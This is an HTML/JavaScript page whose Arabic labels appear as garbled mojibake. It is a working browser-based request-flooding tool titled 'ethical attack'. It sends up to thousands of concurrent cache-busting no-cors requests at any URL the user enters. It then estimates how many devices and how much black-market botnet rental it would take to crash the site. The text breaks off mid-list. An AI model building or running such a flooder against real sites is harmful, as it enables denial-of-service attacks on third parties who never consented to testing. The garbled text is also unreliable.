<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù‡Ø¬Ù…Ø© Ø£Ø®Ù„Ø§Ù‚ÙŠØ©</title>
    <style>
        :root {
            --primary: #e74c3c;
            --secondary: #3498db;
            --success: #2ecc71;
            --warning: #f39c12;
            --danger: #c0392b;
            --light: #ecf0f1;
            --dark: #2c3e50;
            
            /* Ø£Ù„ÙˆØ§Ù† Ø§Ù„ÙˆØ¶Ø¹ Ø§Ù„Ù…Ø¸Ù„Ù… */
            --bg-dark: #121212;
            --card-dark: #1e1e1e;
            --text-dark: #e0e0e0;
            --border-dark: #333;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-dark);
            margin: 0;
            padding: 20px;
            color: var(--text-dark);
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: var(--card-dark);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        
        h1, h2, h3 {
            color: var(--primary);
        }
        
        h1 {
            text-align: center;
            margin-bottom: 30px;
            font-size: 2.2rem;
            border-bottom: 2px solid var(--border-dark);
            padding-bottom: 15px;
        }
        
        .control-panel {
            background: #2a2a2a;
            padding: 25px;
            border-radius: 12px;
            margin-bottom: 30px;
            border: 1px solid var(--border-dark);
        }
        
        .form-row {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .form-group {
            flex: 1;
            min-width: 200px;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 600;
            color: var(--text-dark);
        }
        
        input, select, textarea {
            width: 100%;
            padding: 12px;
            background-color: #333;
            color: var(--text-dark);
            border: 1px solid var(--border-dark);
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 16px;
            transition: border 0.3s;
        }
        
        input:focus, select:focus, textarea:focus {
            border-color: var(--secondary);
            outline: none;
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
            background-color: #444;
        }
        
        .btn-group {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            margin-top: 25px;
        }
        
        button {
            padding: 14px 25px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn-primary {
            background: var(--primary);
            color: white;
        }
        
        .btn-primary:hover {
            background: #c0392b;
            transform: translateY(-2px);
        }
        
        .btn-secondary {
            background: var(--secondary);
            color: white;
        }
        
        .btn-secondary:hover {
            background: #2980b9;
        }
        
        .btn-success {
            background: var(--success);
            color: white;
        }
        
        .btn-danger {
            background: var(--danger);
            color: white;
        }
        
        button:disabled {
            background: #555;
            color: #999;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        
        .stat-card {
            background: var(--card-dark);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
            text-align: center;
            border-top: 4px solid var(--primary);
        }
        
        .stat-card h3 {
            margin-top: 0;
            color: var(--text-dark);
            font-size: 1.1rem;
        }
        
        .stat-value {
            font-size: 2rem;
            font-weight: 700;
            margin: 10px 0;
            color: var(--text-dark);
        }
        
        .progress-container {
            margin-top: 30px;
        }
        
        .progress-info {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            color: var(--text-dark);
        }
        
        .progress-bar {
            height: 12px;
            background: #333;
            border-radius: 6px;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            width: 0%;
            transition: width 0.5s;
        }
        
        .server-health {
            margin-top: 30px;
            padding: 20px;
            border-radius: 10px;
            background: #2a2a2a;
            border-left: 5px solid var(--warning);
            color: var(--text-dark);
        }
        
        .server-health h2 {
            margin-top: 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .health-icon {
            font-size: 1.5rem;
        }
        
        .log-container {
            margin-top: 30px;
            border: 1px solid var(--border-dark);
            border-radius: 10px;
            overflow: hidden;
            background: var(--card-dark);
        }
        
        .log-header {
            background: var(--dark);
            color: white;
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .log-controls button {
            padding: 5px 10px;
            font-size: 14px;
        }
        
        .log-content {
            max-height: 400px;
            overflow-y: auto;
            padding: 15px;
            background: #2a2a2a;
            font-family: 'Courier New', Courier, monospace;
            color: var(--text-dark);
        }
        
        .log-entry {
            padding: 8px 0;
            border-bottom: 1px solid var(--border-dark);
            display: flex;
            gap: 15px;
        }
        
        .log-time {
            color: #aaa;
            flex: 0 0 80px;
        }
        
        .log-message.success {
            color: var(--success);
        }
        
        .log-message.error {
            color: var(--danger);
        }
        
        .log-message.warning {
            color: var(--warning);
        }
        
        .log-message.info {
            color: var(--secondary);
        }
        
        .chart-container {
            margin-top: 30px;
            height: 300px;
            background: var(--card-dark);
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
        }
        
        /* Ù‚Ø³Ù… Ø§Ù„Ù‚ÙˆØ© Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø© Ø§Ù„Ø¬Ø¯ÙŠØ¯ */
        .required-power {
            margin-top: 30px;
            padding: 20px;
            border-radius: 10px;
            background: #2a2a2a;
            border-left: 5px solid var(--secondary);
            color: var(--text-dark);
        }
        
        .required-power h2 {
            margin-top: 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .power-icon {
            font-size: 1.5rem;
        }
        
        .power-calculations {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 15px;
        }
        
        .power-card {
            background: #333;
            padding: 15px;
            border-radius: 8px;
        }
        
        .power-card h4 {
            margin-top: 0;
            color: var(--secondary);
        }
        
        @media (max-width: 768px) {
            .form-row {
                flex-direction: column;
            }
            
            .stats-container, .power-calculations {
                grid-template-columns: 1fr;
            }
            
            .btn-group {
                flex-direction: column;
            }
            
            button {
                width: 100%;
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Ù‡Ø¬ÙˆÙ… Ø£Ø®Ù„Ø§Ù‚ÙŠ | Little Programmer</h1>
        
        <div class="control-panel">
            <div class="form-row">
                <div class="form-group">
                    <label for="url">Ø±Ø§Ø¨Ø· Ø§Ù„Ù…ÙˆÙ‚Ø¹:</label>
                    <input type="url" id="url" placeholder="https://example.com" required>
                </div>
                
                <div class="form-group">
                    <label for="method">Ù†ÙˆØ¹ Ø§Ù„Ù‡Ø¬ÙˆÙ…:</label>
                    <select id="method">
                        <option value="GET">GET</option>
                        <option value="POST">POST</option>
                        <option value="PUT">PUT</option>
                        <option value="DELETE">DELETE</option>
                        <option value="HEAD">HEAD</option>
                    </select>
                </div>
            </div>
            
            <div class="form-row">
                <div class="form-group">
                    <label for="concurrent">Ø¹Ø¯Ø¯ Ø§Ù„Ù‡Ø¬Ù…Ø§Øª Ø§Ù„Ù…ØªØ²Ø§Ù…Ù†Ø©:</label>
                    <input type="number" id="concurrent" value="100" min="1" max="10000">
                </div>
                
                <div class="form-group">
                    <label for="delay">Ø§Ù„ÙØ§ØµÙ„ Ø§Ù„Ø²Ù…Ù†ÙŠ (Ù…Ù„Ù„ÙŠ Ø«Ø§Ù†ÙŠØ©):</label>
                    <input type="number" id="delay" value="500" min="50">
                </div>
                
                <div class="form-group">
                    <label for="duration">Ù…Ø¯Ø© Ø§Ù„Ù‡Ø¬ÙˆÙ… (Ø«Ø§Ù†ÙŠØ©):</label>
                    <input type="number" id="duration" value="300" min="1">
                </div>
            </div>
            
            <div class="form-group">
                <label for="headers">Ø±Ø¤ÙˆØ³ HTTP Ø¥Ø¶Ø§ÙÙŠØ© (JSON):</label>
                <textarea id="headers" rows="3" placeholder='{"X-API-Key": "your-key", "Accept": "application/json"}'></textarea>
            </div>
            
            <div class="btn-group">
                <button id="startBtn" class="btn-primary">
                    <span>â–¶ï¸</span> Ø¨Ø¯Ø¡ Ø§Ù„Ù‡Ø¬ÙˆÙ…
                </button>
                <button id="stopBtn" class="btn-danger" disabled>
                    <span>â¹ï¸</span> Ø¥ÙŠÙ‚Ø§Ù
                </button>
                <button id="saveBtn" class="btn-secondary">
                    <span>ğŸ’¾</span> Ø­ÙØ¸ Ø§Ù„Ù†ØªØ§Ø¦Ø¬
                </button>
                <button id="clearBtn" class="btn-secondary">
                    <span>ğŸ§¹</span> Ù…Ø³Ø­ Ø§Ù„Ø³Ø¬Ù„
                </button>
            </div>
        </div>
        
        <div class="progress-container">
            <div class="progress-info">
                <span>ØªÙ‚Ø¯Ù… Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±</span>
                <span id="progressText">0%</span>
            </div>
            <div class="progress-bar">
                <div class="progress" id="progress"></div>
            </div>
        </div>
        
        <div class="stats-container">
            <div class="stat-card">
                <h3>Ø§Ù„Ø·Ù„Ø¨Ø§Øª Ø§Ù„Ù†Ø§Ø¬Ø­Ø©</h3>
                <div class="stat-value" id="success">0</div>
                <div id="successRate">0%</div>
            </div>
            <div class="stat-card">
                <h3>Ø§Ù„Ø·Ù„Ø¨Ø§Øª Ø§Ù„ÙØ§Ø´Ù„Ø©</h3>
                <div class="stat-value" id="failed">0</div>
                <div id="errorRate">0%</div>
            </div>
            <div class="stat-card">
                <h3>Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„Ø·Ù„Ø¨Ø§Øª</h3>
                <div class="stat-value" id="total">0</div>
                <div id="requestsRate">0/Ø«Ø§Ù†ÙŠØ©</div>
            </div>
            <div class="stat-card">
                <h3>Ù…ØªÙˆØ³Ø· ÙˆÙ‚Øª Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø©</h3>
                <div class="stat-value" id="avgTime">0ms</div>
                <div id="maxTime">Ø§Ù„Ø£Ø¹Ù„Ù‰: 0ms</div>
            </div>
        </div>
        
        <div class="server-health" id="serverHealth">
            <h2><span class="health-icon">ğŸ”</span> ØªÙ‚ÙŠÙŠÙ… Ù‚ÙˆØ© Ø§Ù„Ø³ÙŠØ±ÙØ±</h2>
            <p id="healthText">Ø³ÙŠØ¸Ù‡Ø± Ø§Ù„ØªÙ‚ÙŠÙŠÙ… Ø¨Ø¹Ø¯ Ø¨Ø¯Ø¡ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±...</p>
            <div id="serverSpecs"></div>
        </div>
        
        <!-- Ù‚Ø³Ù… Ø§Ù„Ù‚ÙˆØ© Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø© Ø§Ù„Ø¬Ø¯ÙŠØ¯ -->
        <div class="required-power" id="requiredPower">
            <h2><span class="power-icon">ğŸ“Š</span> ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ù‚ÙˆØ© Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©</h2>
            <p id="powerText">Ø³ÙŠØ¸Ù‡Ø± Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø¨Ø¹Ø¯ Ø¨Ø¯Ø¡ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±...</p>
            <div class="power-calculations" id="powerCalculations"></div>
        </div>
        
        <div class="chart-container">
            <canvas id="responseTimeChart"></canvas>
        </div>
        
        <div class="log-container">
            <div class="log-header">
                <h3>Ø³Ø¬Ù„ Ø§Ù„Ø£Ø­Ø¯Ø§Ø«</h3>
                <div class="log-controls">
                    <button id="exportLogBtn" class="btn-secondary" style="padding: 5px 10px;">ØªØµØ¯ÙŠØ± Ø§Ù„Ø³Ø¬Ù„</button>
                </div>
            </div>
            <div class="log-content" id="log"></div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script>
        // Ø­Ø§Ù„Ø© Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±
        const state = {
            isTesting: false,
            successCount: 0,
            failedCount: 0,
            totalTime: 0,
            requestCount: 0,
            startTime: 0,
            testInterval: null,
            durationTimeout: null,
            workers: [],
            responseTimes: [],
            chart: null,
            concurrentRequests: 1,
            testDuration: 60
        };

        // Ø¹Ù†Ø§ØµØ± Ø§Ù„ÙˆØ§Ø¬Ù‡Ø©
        const elements = {
            url: document.getElementById('url'),
            method: document.getElementById('method'),
            delay: document.getElementById('delay'),
            duration: document.getElementById('duration'),
            concurrent: document.getElementById('concurrent'),
            headers: document.getElementById('headers'),
            startBtn: document.getElementById('startBtn'),
            stopBtn: document.getElementById('stopBtn'),
            saveBtn: document.getElementById('saveBtn'),
            clearBtn: document.getElementById('clearBtn'),
            exportLogBtn: document.getElementById('exportLogBtn'),
            success: document.getElementById('success'),
            failed: document.getElementById('failed'),
            total: document.getElementById('total'),
            avgTime: document.getElementById('avgTime'),
            maxTime: document.getElementById('maxTime'),
            successRate: document.getElementById('successRate'),
            errorRate: document.getElementById('errorRate'),
            requestsRate: document.getElementById('requestsRate'),
            progress: document.getElementById('progress'),
            progressText: document.getElementById('progressText'),
            log: document.getElementById('log'),
            healthText: document.getElementById('healthText'),
            serverSpecs: document.getElementById('serverSpecs'),
            serverHealth: document.getElementById('serverHealth'),
            chartCanvas: document.getElementById('responseTimeChart'),
            powerText: document.getElementById('powerText'),
            powerCalculations: document.getElementById('powerCalculations')
        };

        // Ø§Ù„Ø£Ø­Ø¯Ø§Ø«
        elements.startBtn.addEventListener('click', startTest);
        elements.stopBtn.addEventListener('click', stopTest);
        elements.saveBtn.addEventListener('click', saveResults);
        elements.clearBtn.addEventListener('click', clearLog);
        elements.exportLogBtn.addEventListener('click', exportLog);

        // Ø¨Ø¯Ø¡ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±
        function startTest() {
            const url = elements.url.value;
            const method = elements.method.value;
            const delay = parseInt(elements.delay.value);
            const duration = parseInt(elements.duration.value);
            const concurrent = parseInt(elements.concurrent.value);
            
            if (!url) {
                alert('Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ø§Ø¨Ø· Ø§Ù„Ù…ÙˆÙ‚Ø¹!');
                return;
            }

            // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ø­Ø§Ù„Ø©
            resetState();
            state.isTesting = true;
            state.startTime = Date.now();
            state.concurrentRequests = concurrent;
            state.testDuration = duration;

            // ØªØ¹Ø·ÙŠÙ„/ØªÙ…ÙƒÙŠÙ† Ø§Ù„Ø£Ø²Ø±Ø§Ø±
            elements.startBtn.disabled = true;
            elements.stopBtn.disabled = false;

            // ØªØ³Ø¬ÙŠÙ„ Ø¨Ø¯Ø§ÙŠØ© Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±
            logMessage(`ğŸš€ Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ ${url}`, 'info');
            logMessage(`âš¡ ${method} Ø·Ù„Ø¨Ø§Øª Ù…ØªØ²Ø§Ù…Ù†Ø©: ${concurrent} - Ø§Ù„ÙØ§ØµÙ„: ${delay}ms`, 'info');
            logMessage(`â±ï¸ Ù…Ø¯Ø© Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±: ${duration} Ø«Ø§Ù†ÙŠØ©`, 'info');

            // Ø¨Ø¯Ø¡ Ø§Ù„Ø±Ø³ÙˆÙ… Ø§Ù„Ø¨ÙŠØ§Ù†ÙŠØ©
            initChart();

            // Ø¨Ø¯Ø¡ Ø§Ù„Ø·Ù„Ø¨Ø§Øª Ø§Ù„Ù…ØªØ²Ø§Ù…Ù†Ø©
            for (let i = 0; i < concurrent; i++) {
                state.workers.push(setInterval(() => sendRequest(i), delay));
            }

            // Ø¥ÙŠÙ‚Ø§Ù ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ø§Ù„Ù…Ø¯Ø© Ù…Ø­Ø¯Ø¯Ø©
            if (duration > 0) {
                state.durationTimeout = setTimeout(() => {
                    stopTest();
                    logMessage('â° Ø§Ù†ØªÙ‡Øª Ù…Ø¯Ø© Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ù…Ø­Ø¯Ø¯Ø©', 'info');
                }, duration * 1000);
            }

            // ØªØ­Ø¯ÙŠØ« Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø¯Ù…
            updateProgress();
        }

        // Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ ÙˆØ§Ø­Ø¯ (Ø§Ù„Ù†Ø³Ø®Ø© Ø§Ù„Ù…Ø¹Ø¯Ù„Ø©)
        function sendRequest(workerId) {
            if (!state.isTesting) return;

            const url = elements.url.value;
            const method = elements.method.value;
            const startTime = performance.now();
            const cacheBuster = `?stress_test=${Date.now()}_${workerId}`;
            
            // ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø±Ø¤ÙˆØ³ Ø§Ù„Ø¥Ø¶Ø§ÙÙŠØ©
            let headers = {
                'Cache-Control': 'no-cache'
            };
            
            try {
                const customHeaders = JSON.parse(elements.headers.value || '{}');
                headers = {...headers, ...customHeaders};
            } catch (e) {
                logMessage(`âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø±Ø¤ÙˆØ³: ${e.message}`, 'error');
            }

            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨ Ù…Ø¹ no-cors
            fetch(url + cacheBuster, {
                method: method,
                mode: 'no-cors',  // Ø£Ù‡Ù… ØªØ¹Ø¯ÙŠÙ„
                cache: 'no-cache',
                headers: headers
            })
            .then(() => {  // Ù„Ø§ Ù†ØªØ­Ù‚Ù‚ Ù…Ù† response.status Ø§Ù„Ø¢Ù†
                const endTime = performance.now();
                const duration = endTime - startTime;
                
                updateStats({
                    success: true,  // Ø¯Ø§Ø¦Ù…Ø§ Ù†Ø¬Ø§Ø­ Ù…Ø§ Ø¯Ø§Ù…Øª Ù‡Ù†Ø§Ùƒ Ø§Ø³ØªØ¬Ø§Ø¨Ø©
                    duration: duration,
                    status: 200,    // Ø§ÙØªØ±Ø§Ø¶ÙŠ
                    workerId: workerId
                });
                
                logMessage(
                    `âœ… [Worker ${workerId}] Ø·Ù„Ø¨ #${state.requestCount}: ØªÙ…Øª Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø© - ${duration.toFixed(2)}ms`,
                    'success'
                );
            })
            .catch(error => {
                updateStats({
                    success: false,
                    error: error.message,
                    workerId: workerId
                });
                
                logMessage(
                    `âŒ [Worker ${workerId}] Ø·Ù„Ø¨ #${state.requestCount}: ÙØ´Ù„ - ${error.message}`,
                    'error'
                );
            });
        }

        // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª
        function updateStats({success, duration, status, error, workerId}) {
            state.requestCount++;
            
            if (success) {
                state.successCount++;
                state.totalTime += duration;
                state.responseTimes.push(duration);
                updateChart(duration);
            } else {
                state.failedCount++;
            }
            
            // ØªØ­Ø¯ÙŠØ« Ø§Ù„ÙˆØ§Ø¬Ù‡Ø©
            elements.success.textContent = state.successCount;
            elements.failed.textContent = state.failedCount;
            elements.total.textContent = state.requestCount;
            
            // Ø­Ø³Ø§Ø¨ Ø§Ù„Ù…Ø¹Ø¯Ù„Ø§Øª
            const successRate = (state.successCount / state.requestCount * 100).toFixed(1);
            const errorRate = (state.failedCount / state.requestCount * 100).toFixed(1);
            
            elements.successRate.textContent = `${successRate}%`;
            elements.errorRate.textContent = `${errorRate}%`;
            
            // Ø£ÙˆÙ‚Ø§Øª Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø©
            if (success) {
                const avgTime = (state.totalTime / state.successCount).toFixed(2);
                elements.avgTime.textContent = `${avgTime}ms`;
                
                const maxTime = Math.max(...state.responseTimes).toFixed(2);
                elements.maxTime.textContent = `Ø§Ù„Ø£Ø¹Ù„Ù‰: ${maxTime}ms`;
            }
            
            // Ù…Ø¹Ø¯Ù„ Ø§Ù„Ø·Ù„Ø¨Ø§Øª
            const elapsed = (Date.now() - state.startTime) / 1000;
            const requestsPerSec = (state.requestCount / elapsed).toFixed(2);
            elements.requestsRate.textContent = `${requestsPerSec}/Ø«Ø§Ù†ÙŠØ©`;
            
            // ØªÙ‚ÙŠÙŠÙ… Ø§Ù„Ø³ÙŠØ±ÙØ±
            evaluateServerHealth();
            
            // ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ù‚ÙˆØ© Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©
            analyzeRequiredPower(requestsPerSec);
        }

        // ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ù‚ÙˆØ© Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø© Ù„Ø¥Ø³Ù‚Ø§Ø· Ø§Ù„Ù…ÙˆÙ‚Ø¹
        function analyzeRequiredPower(requestsPerSec) {
            if (state.requestCount < 10) return; // Ù„Ø§ ØªØ­Ù„Ù„ Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ù‚Ù„ÙŠÙ„Ø©
            
            // Ø§ÙØªØ±Ø§Ø¶ Ø£Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙŠØ³Ù‚Ø· Ø¹Ù†Ø¯ 5 Ø£Ø¶Ø¹Ø§Ù Ù…Ø¹Ø¯Ù„ Ø§Ù„Ø·Ù„Ø¨Ø§Øª Ø§Ù„Ø­Ø§Ù„ÙŠ
            const crashThreshold = requestsPerSec * 5;
            
            // Ø§ÙØªØ±Ø§Ø¶ Ø£Ù† ÙƒÙ„ Ø¬Ù‡Ø§Ø² ÙŠÙ…ÙƒÙ†Ù‡ Ø¥Ø±Ø³Ø§Ù„ 50 Ø·Ù„Ø¨/Ø«Ø§Ù†ÙŠØ© (ÙŠØ¹ØªÙ…Ø¯ Ø¹Ù„Ù‰ Ø§ØªØµØ§Ù„ Ø§Ù„Ø¥Ù†ØªØ±Ù†Øª)
            const requestsPerDevice = 50;
            
            // Ø¹Ø¯Ø¯ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø© Ù„ØªØ¬Ø§ÙˆØ² Ø¹ØªØ¨Ø© Ø§Ù„Ø³Ù‚ÙˆØ·
            const devicesNeeded = Math.ceil(crashThreshold / requestsPerDevice);
            
            // ØªÙ‚Ø¯ÙŠØ± Ø­Ø¬Ù… Ù‡Ø¬ÙˆÙ… DDoS Ø§Ù„Ù…Ø·Ù„ÙˆØ¨
            const ddosSize = (devicesNeeded * requestsPerDevice).toLocaleString();
            
            // ØªÙ‚Ø¯ÙŠØ± ØªÙƒÙ„ÙØ© Ù‡Ø¬ÙˆÙ… DDoS (Ø§ÙØªØ±Ø§Ø¶ $0.5 Ù„ÙƒÙ„ Ø¬Ù‡Ø§Ø² ÙÙŠ Ø§Ù„Ø³Ø§Ø¹Ø©)
            const ddosCost = (devicesNeeded * 0.5).toLocaleString();
            
            // ØªØ­Ø¯ÙŠØ« ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
            elements.powerText.innerHTML = `
                <strong>Ù…Ø¹Ø¯Ù„ Ø§Ù„Ø·Ù„Ø¨Ø§Øª Ø§Ù„Ø­Ø§Ù„ÙŠ:</strong> ${requestsPerSec}/Ø«Ø§Ù†ÙŠØ©<br>
                <strong>Ø¹ØªØ¨Ø© Ø§Ù„Ø³Ù‚ÙˆØ· Ø§Ù„Ù…Ù‚Ø¯Ø±Ø©:</strong> ~${crashThreshold.toLocaleString()}/Ø«Ø§Ù†ÙŠØ©
            `;
            
            elements.powerCalculations.innerHTML = `
                <div class="power-card">
                    <h4>Ø¹Ø¯Ø¯ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©</h4>
                    <p>Ù„Ø¥Ø³Ù‚Ø§Ø· Ù‡Ø°Ø§ Ø§Ù„Ù…ÙˆÙ‚Ø¹ØŒ Ù‚Ø¯ ØªØ­ØªØ§Ø¬ Ø¥Ù„Ù‰ <strong>${devicesNeeded}</strong> Ø¬Ù‡Ø§Ø² ÙŠØ¹Ù…Ù„ÙˆÙ† ÙÙŠ Ù†ÙØ³ Ø§Ù„ÙˆÙ‚Øª.</p>
                    <p>ÙƒÙ„ Ø¬Ù‡Ø§Ø² Ù‚Ø§Ø¯Ø± Ø¹Ù„Ù‰ Ø¥Ø±Ø³Ø§Ù„ ~${requestsPerDevice} Ø·Ù„Ø¨/Ø«Ø§Ù†ÙŠØ©.</p>
                </div>
                <div class="power-card">
                    <h4>Ø­Ø¬Ù… Ù‡Ø¬ÙˆÙ… DDoS</h4>
                    <p>Ù‡Ø¬ÙˆÙ… DDoS ÙØ¹Ø§Ù„ ÙŠØ­ØªØ§Ø¬ Ø¥Ù„Ù‰ <strong>${ddosSize}</strong> Ø·Ù„Ø¨/Ø«Ø§Ù†ÙŠØ©.</p>
                    <p>Ù‡Ø°Ø§ ÙŠØ¹Ø§Ø¯Ù„ ~${Math.ceil(devicesNeeded/1000)}k Ø¬Ù‡Ø§Ø².</p>
                </div>
                <div class="power-card">
                    <h4>Ø§Ù„ØªÙƒÙ„ÙØ© Ø§Ù„Ù…Ù‚Ø¯Ø±Ø©</h4>
                    <p>ØªÙƒÙ„ÙØ© Ø§Ø³ØªØ¦Ø¬Ø§Ø± Ø´Ø¨ÙƒØ© Ø¨ÙˆØª Ù†Øª Ù„Ù‡Ø°Ø§ Ø§Ù„Ù‡Ø¬ÙˆÙ…: <strong>~${ddosCost}$/Ø³Ø§Ø¹Ø©</strong>.</p>
                    <p>Ù‡Ø°Ø§ ØªÙ‚Ø¯ÙŠØ± ÙŠØ¹ØªÙ…Ø¯ Ø¹Ù„Ù‰ Ø£Ø³Ø¹Ø§Ø± Ø§Ù„Ø³ÙˆÙ‚ Ø§Ù„Ø³ÙˆØ¯Ø§Ø¡.</p>
                </div>
                <div class="power-card">
                    <h4>Ù†Ù‚Ø§Ø· Ø§Ù„Ø¶Ø¹Ù</h4>
                    <p>Ù„Ø­Ù…Ø§ÙŠØ© Ø§Ù„Ù…ÙˆÙ‚Ø¹ØŒ ÙŠØ¬Ø¨ Ø£Ù† ÙŠØ¯Ø¹Ù… <strong>${Math.ceil(crashThreshold*1.2).toLocaleString()}</strong> Ø·Ù„Ø¨/Ø«Ø§Ù†ÙŠØ©.</p>
                    <p>Ø§Ø³ØªØ®Ø¯Ù… CDN ÙˆÙ…ÙˆØ§Ø²Ù† Ø­Ù…Ù„ Ù„ØªØ­Ø³ÙŠÙ† Ø§Ù„Ø£Ø¯Ø§Ø¡.</p>
                </div>
            `;
        }

        // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±
        function stopTest() {
            if (!state.isTesting) return;
            
            state.isTesting = false;
            
            // Ø¥ÙŠÙ‚Ø§Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¹Ù…Ø§Ù„
            state.workers.forEach(worker => clearInterval(worker));
            state.workers = [];
            
            // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ù…Ø¤Ù‚ØªØ§Øª
            clearTimeout(state.durationTimeout);
            
            // ØªØ­Ø¯ÙŠØ« Ø§Ù„ÙˆØ§Ø¬Ù‡Ø©
            elements.startBtn.disabled = false;
            elements.stopBtn.disabled = true;
            
            const totalTime = (Date.now() - state.startTime) / 1000;
            logMessage(`ğŸ›‘ ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø¨Ø¹Ø¯ ${totalTime.toFixed(2)} Ø«Ø§Ù†ÙŠØ©`, 'info');
            
            // Ø§Ù„ØªÙ‚ÙŠÙŠÙ… Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ Ù„Ù„Ø³ÙŠØ±ÙØ±
            evaluateServerHealth(true);
            
            // Ø§Ù„ØªÙ‚ÙŠÙŠÙ… Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ Ù„Ù„Ù‚ÙˆØ© Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©
            const requestsPerSec = (state.requestCount / totalTime).toFixed(2);
            analyzeRequiredPower(requestsPerSec);
        }

        // ØªÙ‚ÙŠÙŠÙ… ØµØ­Ø© Ø§Ù„Ø³ÙŠØ±ÙØ±
        function evaluateServerHealth(final = false) {
            if (state.requestCount === 0) return;
            
            const avgResponseTime = state.successCount > 0 ? state.totalTime / state.successCount : 0;
            const errorRate = (state.failedCount / state.requestCount) * 100;
            const requestsPerSec = state.requestCount / ((Date.now() - state.startTime) / 1000);
            
            let healthStatus = '';
            let healthIcon = 'ğŸ”';
            let healthClass = 'info';
            let specs = '';
            
            if (errorRate > 30 || avgResponseTime > 5000) {
                healthStatus = 'Ø¶Ø¹ÙŠÙ Ø¬Ø¯Ù‹Ø§';
                healthIcon = 'ğŸ’¥';
                healthClass = 'error';
                specs = `
                    <ul>
                        <li>ÙŠØ­ØªÙ…Ù„ Ø£Ù† ÙŠÙƒÙˆÙ† Ø³ÙŠØ±ÙØ± Ø¨Ù…ÙˆØ§ØµÙØ§Øª Ù…Ø­Ø¯ÙˆØ¯Ø© (1 CoreØŒ 1GB RAM)</li>
